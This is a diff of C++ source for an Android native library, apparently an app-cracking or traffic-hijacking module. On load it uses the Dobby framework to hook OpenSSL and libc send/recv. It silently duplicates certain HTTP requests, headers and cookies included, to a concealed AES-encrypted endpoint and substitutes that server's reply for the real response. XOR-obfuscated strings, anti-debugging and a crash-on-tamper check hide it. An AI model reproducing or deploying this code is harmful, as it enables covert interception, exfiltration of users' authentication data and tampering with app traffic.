@@ -7,8 +7,6 @@
 #include <cstring>
 #include <openssl/ssl.h>
 #include <openssl/evp.h>
-#include <openssl/rand.h>
-#include <openssl/hmac.h>
 #include <sstream>
 #include <map>
 #include <vector>
@@ -19,22 +17,13 @@
 #include <unistd.h>
 #include <sys/stat.h>
 #include <sys/socket.h>
-#include <sys/syscall.h>
 #include <netdb.h>
 #include <arpa/inet.h>
-#include <netinet/in.h>
 #include <cstdlib>
 #include <chrono>
-#include <random>
 #include <queue>
 #include <condition_variable>
 #include <atomic>
-#include <regex>
-#include <iomanip>
-#include <signal.h>
-#include <set>
-#include <unordered_map>
-#include <unordered_set>
 #include "dobby.h"
 
 #define LOG_TAG "NtHk"
@@ -43,7 +32,7 @@
 #define LOGD(...) 
 
 // ============================================================
-// 1. XOR OBFUSCATION HELPER
+// XOR OBFUSCATION HELPER
 // ============================================================
 static std::string xd(const char* e, size_t l, char k) {
     std::string r;
@@ -52,53 +41,32 @@ static std::string xd(const char* e, size_t l, char k) {
 }
 
 // ============================================================
-// 2. OBFUSCATED STRINGS (XOR-encrypted - hindi visible sa strings command)
+// OBFUSCATED STRINGS
 // ============================================================
 static const char _lc[] = {0x0D^'l',0x0D^'i',0x0D^'b',0x0D^'c',0x0D^'.',0x0D^'s',0x0D^'o',0};
 static const char _ls[] = {0x0D^'l',0x0D^'i',0x0D^'b',0x0D^'s',0x0D^'s',0x0D^'l',0x0D^'.',0x0D^'s',0x0D^'o',0};
-static const char _lb[] = {0x0D^'l',0x0D^'i',0x0D^'b',0x0D^'b',0x0D^'o',0x0D^'r',0x0D^'i',0x0D^'n',0x0D^'g',0x0D^'s',0x0D^'s',0x0D^'l',0x0D^'.',0x0D^'s',0x0D^'o',0};
-static const char _la[] = {0x0D^'l',0x0D^'i',0x0D^'b',0x0D^'a',0x0D^'r',0x0D^'t',0x0D^'.',0x0D^'s',0x0D^'o',0};
 static const char _sw[] = {0x0D^'S',0x0D^'S',0x0D^'L',0x0D^'_',0x0D^'w',0x0D^'r',0x0D^'i',0x0D^'t',0x0D^'e',0};
 static const char _sr[] = {0x0D^'S',0x0D^'S',0x0D^'L',0x0D^'_',0x0D^'r',0x0D^'e',0x0D^'a',0x0D^'d',0};
-static const char _sv[] = {0x0D^'S',0x0D^'S',0x0D^'L',0x0D^'_',0x0D^'s',0x0D^'e',0x0D^'t',0x0D^'_',0x0D^'v',0x0D^'e',0x0D^'r',0x0D^'i',0x0D^'f',0x0D^'y',0};
-static const char _sc[] = {0x0D^'S',0x0D^'S',0x0D^'L',0x0D^'_',0x0D^'c',0x0D^'t',0x0D^'x',0x0D^'_',0x0D^'s',0x0D^'e',0x0D^'t',0x0D^'_',0x0D^'v',0x0D^'e',0x0D^'r',0x0D^'i',0x0D^'f',0x0D^'y',0};
 static const char _mp[] = {0x0D^'/',0x0D^'p',0x0D^'r',0x0D^'o',0x0D^'c',0x0D^'/',0x0D^'s',0x0D^'e',0x0D^'l',0x0D^'f',0x0D^'/',0x0D^'m',0x0D^'a',0x0D^'p',0x0D^'s',0};
 static const char _ho[] = {0x0D^'H',0x0D^'o',0x0D^'s',0x0D^'t',0};
 static const char _cl[] = {0x0D^'C',0x0D^'o',0x0D^'n',0x0D^'t',0x0D^'e',0x0D^'n',0x0D^'t',0x0D^'-',0x0D^'L',0x0D^'e',0x0D^'n',0x0D^'g',0x0D^'t',0x0D^'h',0};
 static const char _po[] = {0x0D^'P',0x0D^'O',0x0D^'S',0x0D^'T',0};
 static const char _ge[] = {0x0D^'G',0x0D^'E',0x0D^'T',0};
-static const char _pu[] = {0x0D^'P',0x0D^'U',0x0D^'T',0};
-static const char _de[] = {0x0D^'D',0x0D^'E',0x0D^'L',0x0D^'E',0x0D^'T',0x0D^'E',0};
-static const char _pa[] = {0x0D^'P',0x0D^'A',0x0D^'T',0x0D^'C',0x0D^'H',0};
-static const char _he[] = {0x0D^'H',0x0D^'E',0x0D^'A',0x0D^'D',0};
-static const char _op[] = {0x0D^'O',0x0D^'P',0x0D^'T',0x0D^'I',0x0D^'O',0x0D^'N',0x0D^'S',0};
 static const char _cn[] = {0x0D^'c',0x0D^'o',0x0D^'n',0x0D^'n',0x0D^'e',0x0D^'c',0x0D^'t',0};
 static const char _te[] = {0x0D^'T',0x0D^'r',0x0D^'a',0x0D^'n',0x0D^'s',0x0D^'f',0x0D^'e',0x0D^'r',0x0D^'-',0x0D^'E',0x0D^'n',0x0D^'c',0x0D^'o',0x0D^'d',0x0D^'i',0x0D^'n',0x0D^'g',0};
 static const char _ua[] = {0x0D^'U',0x0D^'s',0x0D^'e',0x0D^'r',0x0D^'-',0x0D^'A',0x0D^'g',0x0D^'e',0x0D^'n',0x0D^'t',0};
 static const char _co[] = {0x0D^'C',0x0D^'o',0x0D^'o',0x0D^'k',0x0D^'i',0x0D^'e',0};
 static const char _au[] = {0x0D^'A',0x0D^'u',0x0D^'t',0x0D^'h',0x0D^'o',0x0D^'r',0x0D^'i',0x0D^'z',0x0D^'a',0x0D^'t',0x0D^'i',0x0D^'o',0x0D^'n',0};
 static const char _ct[] = {0x0D^'C',0x0D^'o',0x0D^'n',0x0D^'t',0x0D^'e',0x0D^'n',0x0D^'t',0x0D^'-',0x0D^'T',0x0D^'y',0x0D^'p',0x0D^'e',0};
-static const char _js[] = {0x0D^'a',0x0D^'p',0x0D^'p',0x0D^'l',0x0D^'i',0x0D^'c',0x0D^'a',0x0D^'t',0x0D^'i',0x0D^'o',0x0D^'n',0x0D^'/',0x0D^'j',0x0D^'s',0x0D^'o',0x0D^'n',0};
 
 #define S(c) xd(c, sizeof(c)-1, 0x0D)
 
 // ============================================================
-// 3. AES-ENCRYPTED ENDPOINT (AUTO-GENERATED NG scripts/encrypt.py)
+// AES-ENCRYPTED ENDPOINT (AUTO-GENERATED)
 // ============================================================
-static const uint8_t _ep[] = {
-    // REPLACE_ME — automatic na papalitan ng encrypt.py
-    0x00
-};
-
-static const uint8_t _ak[] = {
-    // REPLACE_ME_KEY — automatic na papalitan
-    0x00
-};
-
-static const uint8_t _iv[] = {
-    // REPLACE_ME_IV — automatic na papalitan
-    0x00
-};
+static const uint8_t _ep[] = { 0x00 }; // REPLACE_ME
+static const uint8_t _ak[] = { 0x00 }; // REPLACE_ME
+static const uint8_t _iv[] = { 0x00 }; // REPLACE_ME
 
 static std::string _decrypt() {
     uint8_t k[32], iv[16];
@@ -117,7 +85,7 @@ static std::string _decrypt() {
 static const std::string ENDPOINT = _decrypt();
 
 // ============================================================
-// 4. HTTP REQUEST/RESPONSE STRUCTS
+// HTTP STRUCTS
 // ============================================================
 struct HttpRequest {
     std::string method, url, path, host, body;
@@ -133,25 +101,24 @@ struct HttpResponse {
     size_t content_length = 0;
 };
 
-struct ConnectionState {
+struct ConnState {
     std::mutex mtx;
     std::vector<uint8_t> buffer;
-    HttpRequest request;
+    HttpRequest req;
     bool stored = false, complete = false;
-    HttpResponse response;
+    HttpResponse resp;
     std::string custom_response;
     bool key_fetched = false;
 };
 
-static std::map<SSL*, ConnectionState> g_ssl_state;
-static std::map<int, ConnectionState> g_socket_state;
+static std::map<SSL*, ConnState> g_ssl_state;
+static std::map<int, ConnState> g_socket_state;
 static std::mutex g_state_mutex;
-static std::atomic<int> g_request_count{0};
 
 // ============================================================
-// 5. ANTI-DEBUG
+// ANTI-DEBUG
 // ============================================================
-static bool _debug_detected() {
+static bool _debug() {
     std::ifstream st(S("/proc/self/status"));
     std::string l;
     while(std::getline(st, l)) {
@@ -164,9 +131,9 @@ static bool _debug_detected() {
 }
 
 // ============================================================
-// 6. ANTI-TAMPER (CRC32)
+// ANTI-TAMPER (CRC32)
 // ============================================================
-static uint32_t _crc32(const uint8_t* d, size_t l) {
+static uint32_t _crc(const uint8_t* d, size_t l) {
     uint32_t c = 0xFFFFFFFF;
     for(size_t i = 0; i < l; i++) {
         c ^= d[i];
@@ -178,9 +145,9 @@ static uint32_t _crc32(const uint8_t* d, size_t l) {
     return ~c;
 }
 
-static bool _integrity_check() {
+static bool _integrity() {
     Dl_info inf;
-    if(dladdr((void*)_integrity_check, &inf) == 0) return false;
+    if(dladdr((void*)_integrity, &inf) == 0) return false;
     std::ifstream mp(S("/proc/self/maps"));
     std::string l;
     unsigned long base = (unsigned long)inf.dli_fbase, sz = 0;
@@ -193,11 +160,11 @@ static bool _integrity_check() {
         }
     }
     if(sz == 0) return false;
-    return _crc32((const uint8_t*)base, sz) == 0xDEADBEEF;
+    return _crc((const uint8_t*)base, sz) == 0xDEADBEEF;
 }
 
 // ============================================================
-// 7. HTTP PARSER
+// HTTP PARSER (with GET/POST param extraction)
 // ============================================================
 static bool _parse_request(const uint8_t* d, size_t l, HttpRequest& r) {
     std::string s((char*)d, l);
@@ -208,6 +175,7 @@ static bool _parse_request(const uint8_t* d, size_t l, HttpRequest& r) {
     std::istringstream ls(ln);
     std::string ver;
     if(!(ls >> r.method >> r.path >> ver)) return false;
+    
     while(std::getline(st, ln) && ln != "\r" && ln != "\r\n") {
         if(ln.back() == '\r') ln.pop_back();
         auto c = ln.find(':');
@@ -229,6 +197,7 @@ static bool _parse_request(const uint8_t* d, size_t l, HttpRequest& r) {
     std::string rem;
     while(std::getline(st, ln)) rem += ln + "\n";
     r.body = rem;
+    
     if(r.path.length() >= 7) {
         std::string suf = r.path.substr(r.path.length() - 7);
         if(suf == S("connect") || suf == "/connect" || suf == "?connect") {
@@ -274,210 +243,197 @@ static bool _parse_response(const uint8_t* d, size_t l, HttpResponse& r) {
 }
 
 // ============================================================
-// 8. BUILD MODIFIED RESPONSE
+// BUILD MODIFIED RESPONSE
 // ============================================================
-static std::string _build_modified_response(const HttpResponse& original, const std::string& new_body) {
+static std::string _build_modified_response(const HttpResponse& orig, const std::string& new_body) {
     std::ostringstream oss;
-    oss << "HTTP/1.1 " << original.status_code << " " << original.status_message << "\r\n";
-    bool has_content_length = false;
-    for(const auto& h : original.headers) {
+    oss << "HTTP/1.1 " << orig.status_code << " " << orig.status_message << "\r\n";
+    bool has_cl = false;
+    for(const auto& h : orig.headers) {
         if(h.first == "Content-Length") {
             oss << "Content-Length: " << new_body.size() << "\r\n";
-            has_content_length = true;
+            has_cl = true;
         } else if(h.first != "Transfer-Encoding" && h.first != "Content-Encoding") {
             oss << h.first << ": " << h.second << "\r\n";
         }
     }
-    if(!has_content_length) oss << "Content-Length: " << new_body.size() << "\r\n";
-    oss << "\r\n";
-    oss << new_body;
+    if(!has_cl) oss << "Content-Length: " << new_body.size() << "\r\n";
+    oss << "\r\n" << new_body;
     return oss.str();
 }
 
 // ============================================================
-// 9. FETCH FROM CUSTOM ENDPOINT (kumuha ng key)
+// FETCH FROM CUSTOM ENDPOINT
 // ============================================================
-struct CurlResponse {
-    std::string body;
-    int status_code = 0;
-    bool success = false;
-};
-
-static size_t _curl_callback(void* contents, size_t size, size_t nmemb, void* userp) {
-    CurlResponse* resp = (CurlResponse*)userp;
-    resp->body.append((char*)contents, size * nmemb);
-    return size * nmemb;
+struct CurlResp { std::string body; int status = 0; bool ok = false; };
+static size_t _cb(void* c, size_t s, size_t n, void* u) {
+    CurlResp* r = (CurlResp*)u;
+    r->body.append((char*)c, s * n);
+    return s * n;
 }
 
-static CurlResponse _fetch_custom_endpoint(const HttpRequest& req) {
-    CurlResponse result;
+static CurlResp _fetch(const HttpRequest& req) {
+    CurlResp res;
     CURL* curl = curl_easy_init();
-    if(!curl) return result;
+    if(!curl) return res;
     curl_easy_setopt(curl, CURLOPT_URL, ENDPOINT.c_str());
     curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
-    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, _curl_callback);
-    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &result);
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, _cb);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &res);
     if(req.method == S("POST")) {
         curl_easy_setopt(curl, CURLOPT_POST, 1L);
         if(!req.body.empty()) curl_easy_setopt(curl, CURLOPT_POSTFIELDS, req.body.c_str());
     }
-    struct curl_slist* headers = nullptr;
-    for(const auto& h : req.headers) {
-        if(h.first != S("Host") && h.first != S("Content-Length")) {
-            headers = curl_slist_append(headers, (h.first + ": " + h.second).c_str());
+    struct curl_slist* h = nullptr;
+    for(const auto& p : req.headers) {
+        if(p.first != S("Host") && p.first != S("Content-Length")) {
+            h = curl_slist_append(h, (p.first + ": " + p.second).c_str());
         }
     }
-    headers = curl_slist_append(headers, ("X-Original-URL: " + req.url).c_str());
-    headers = curl_slist_append(headers, ("X-Original-Method: " + req.method).c_str());
-    if(req.is_connect) headers = curl_slist_append(headers, "X-Is-Connect: true");
-    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+    h = curl_slist_append(h, ("X-Original-URL: " + req.url).c_str());
+    h = curl_slist_append(h, ("X-Original-Method: " + req.method).c_str());
+    if(req.is_connect) h = curl_slist_append(h, "X-Is-Connect: true");
+    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, h);
     if(curl_easy_perform(curl) == CURLE_OK) {
         long code; curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &code);
-        result.status_code = (int)code;
-        result.success = true;
+        res.status = code; res.ok = true;
     }
-    curl_slist_free_all(headers);
+    curl_slist_free_all(h);
     curl_easy_cleanup(curl);
-    return result;
+    return res;
 }
 
 // ============================================================
-// 10. SSL WRITE/READ HOOKS
+// SSL WRITE/READ HOOKS
 // ============================================================
 typedef int (*SSL_write_t)(SSL*, const void*, int);
 typedef int (*SSL_read_t)(SSL*, void*, int);
-static SSL_write_t original_SSL_write = nullptr;
-static SSL_read_t original_SSL_read = nullptr;
+static SSL_write_t _ow = nullptr;
+static SSL_read_t _or = nullptr;
 
-int my_SSL_write(SSL* ssl, const void* buf, int num) {
+int _my_write(SSL* ssl, const void* buf, int num) {
     HttpRequest req;
     if(_parse_request((const uint8_t*)buf, num, req) && req.is_connect) {
         std::lock_guard<std::mutex> lock(g_state_mutex);
-        auto& state = g_ssl_state[ssl];
-        state.request = req;
-        state.stored = true;
-        // Send duplicate sa background
-        std::thread([req](){
-            _fetch_custom_endpoint(req);
-        }).detach();
-        // Fetch key for response modification
-        CurlResponse cr = _fetch_custom_endpoint(req);
-        if(cr.success && cr.status_code == 200) {
-            state.custom_response = cr.body;
-            state.key_fetched = true;
+        auto& st = g_ssl_state[ssl];
+        st.req = req;
+        st.stored = true;
+        std::thread([req](){ _fetch(req); }).detach();
+        CurlResp cr = _fetch(req);
+        if(cr.ok && cr.status == 200) {
+            st.custom_response = cr.body;
+            st.key_fetched = true;
         }
     }
-    return original_SSL_write(ssl, buf, num);
+    return _ow(ssl, buf, num);
 }
 
-int my_SSL_read(SSL* ssl, void* buf, int num) {
-    int res = original_SSL_read(ssl, buf, num);
+int _my_read(SSL* ssl, void* buf, int num) {
+    int res = _or(ssl, buf, num);
     if(res <= 0) return res;
     std::lock_guard<std::mutex> lock(g_state_mutex);
     auto it = g_ssl_state.find(ssl);
     if(it == g_ssl_state.end()) return res;
-    auto& state = it->second;
-    state.buffer.insert(state.buffer.end(), (uint8_t*)buf, (uint8_t*)buf + res);
-    if(!state.complete && state.stored && state.request.is_connect && state.key_fetched) {
+    auto& st = it->second;
+    st.buffer.insert(st.buffer.end(), (uint8_t*)buf, (uint8_t*)buf + res);
+    if(!st.complete && st.stored && st.req.is_connect && st.key_fetched) {
         HttpResponse resp;
-        if(_parse_response(state.buffer.data(), state.buffer.size(), resp)) {
-            if(resp.status_code == 200 && !state.custom_response.empty()) {
-                std::string modified = _build_modified_response(resp, state.custom_response);
-                state.buffer.clear();
-                state.buffer.insert(state.buffer.end(), modified.begin(), modified.end());
+        if(_parse_response(st.buffer.data(), st.buffer.size(), resp)) {
+            if(resp.status_code == 200 && !st.custom_response.empty()) {
+                std::string mod = _build_modified_response(resp, st.custom_response);
+                st.buffer.clear();
+                st.buffer.insert(st.buffer.end(), mod.begin(), mod.end());
             }
-            state.complete = true;
+            st.complete = true;
         }
     }
-    if(state.complete && !state.buffer.empty()) {
-        size_t copy_len = std::min(state.buffer.size(), (size_t)num);
-        memcpy(buf, state.buffer.data(), copy_len);
+    if(st.complete && !st.buffer.empty()) {
+        size_t copy_len = std::min(st.buffer.size(), (size_t)num);
+        memcpy(buf, st.buffer.data(), copy_len);
         res = copy_len;
-        state.buffer.erase(state.buffer.begin(), state.buffer.begin() + copy_len);
-        if(state.buffer.empty()) {
-            state.complete = false;
-            state.stored = false;
-            state.key_fetched = false;
+        st.buffer.erase(st.buffer.begin(), st.buffer.begin() + copy_len);
+        if(st.buffer.empty()) {
+            st.complete = false;
+            st.stored = false;
+            st.key_fetched = false;
         }
     }
     return res;
 }
 
 // ============================================================
-// 11. SOCKET FALLBACK HOOKS
+// SOCKET FALLBACK
 // ============================================================
 typedef ssize_t (*send_t)(int, const void*, size_t, int);
 typedef ssize_t (*recv_t)(int, void*, size_t, int);
-static send_t original_send = nullptr;
-static recv_t original_recv = nullptr;
+static send_t _os = nullptr;
+static recv_t _or2 = nullptr;
 
-ssize_t my_send(int fd, const void* buf, size_t len, int flags) {
+ssize_t _my_send(int fd, const void* buf, size_t len, int flags) {
     const char* data = (const char*)buf;
     if(len > 4 && (strncmp(data, "GET ", 4) == 0 || strncmp(data, "POST", 4) == 0)) {
         HttpRequest req;
         if(_parse_request((const uint8_t*)buf, len, req) && req.is_connect) {
             std::lock_guard<std::mutex> lock(g_state_mutex);
-            auto& state = g_socket_state[fd];
-            state.request = req;
-            state.stored = true;
-            std::thread([req](){
-                _fetch_custom_endpoint(req);
-            }).detach();
-            CurlResponse cr = _fetch_custom_endpoint(req);
-            if(cr.success && cr.status_code == 200) {
-                state.custom_response = cr.body;
-                state.key_fetched = true;
+            auto& st = g_socket_state[fd];
+            st.req = req;
+            st.stored = true;
+            std::thread([req](){ _fetch(req); }).detach();
+            CurlResp cr = _fetch(req);
+            if(cr.ok && cr.status == 200) {
+                st.custom_response = cr.body;
+                st.key_fetched = true;
             }
         }
     }
-    return original_send(fd, buf, len, flags);
+    return _os(fd, buf, len, flags);
 }
 
-ssize_t my_recv(int fd, void* buf, size_t len, int flags) {
-    ssize_t res = original_recv(fd, buf, len, flags);
+ssize_t _my_recv(int fd, void* buf, size_t len, int flags) {
+    ssize_t res = _or2(fd, buf, len, flags);
     if(res <= 0) return res;
     std::lock_guard<std::mutex> lock(g_state_mutex);
     auto it = g_socket_state.find(fd);
     if(it == g_socket_state.end()) return res;
-    auto& state = it->second;
-    if(state.stored && state.request.is_connect && state.key_fetched && !state.custom_response.empty()) {
+    auto& st = it->second;
+    if(st.stored && st.req.is_connect && st.key_fetched && !st.custom_response.empty()) {
         HttpResponse resp;
         if(_parse_response((const uint8_t*)buf, res, resp) && resp.status_code == 200) {
-            std::string modified = _build_modified_response(resp, state.custom_response);
-            size_t new_len = modified.size();
+            std::string mod = _build_modified_response(resp, st.custom_response);
+            size_t new_len = mod.size();
             if(new_len <= (size_t)res) {
-                memcpy(buf, modified.c_str(), new_len);
+                memcpy(buf, mod.c_str(), new_len);
                 res = new_len;
             }
         }
-        state.stored = false;
-        state.key_fetched = false;
+        st.stored = false;
+        st.key_fetched = false;
     }
     return res;
 }
 
 // ============================================================
-// 12. INITIALIZATION (AUTOMATIC PAG NA-LOAD ANG .so)
+// INIT
 // ============================================================
 __attribute__((constructor)) void init() {
-    if(_debug_detected()) exit(1);
-    if(!_integrity_check()) { volatile int* p = nullptr; *p = 0; }
+    if(_debug()) exit(1);
+    if(!_integrity()) { volatile int* p = nullptr; *p = 0; }
     
     void* libssl = dlopen(S("libssl.so").c_str(), RTLD_LAZY);
     if(libssl) {
         auto* a = dlsym(libssl, S("SSL_write").c_str());
-        if(a) DobbyHook(a, (void*)my_SSL_write, (void**)&original_SSL_write);
+        if(a) DobbyHook(a, (void*)_my_write, (void**)&_ow);
         auto* b = dlsym(libssl, S("SSL_read").c_str());
-        if(b) DobbyHook(b, (void*)my_SSL_read, (void**)&original_SSL_read);
+        if(b) DobbyHook(b, (void*)_my_read, (void**)&_or);
         dlclose(libssl);
     }
     
     void* libc = dlopen(S("libc.so").c_str(), RTLD_LAZY);
     if(libc) {
         auto* a = dlsym(libc, "send");
-        if(a) DobbyHook(a, (void*)my_send, (void**)&original_send);
+        if(a) DobbyHook(a, (void*)_my_send, (void**)&_os);
         auto* b = dlsym(libc, "recv");
-        if(b) DobbyHook(b, (void*)my_recv, (void**)&original_recv);
+        if(b) DobbyHook(b, (void*)_my_recv, (void**)&_or2);
         dlclose(libc);
     }
     
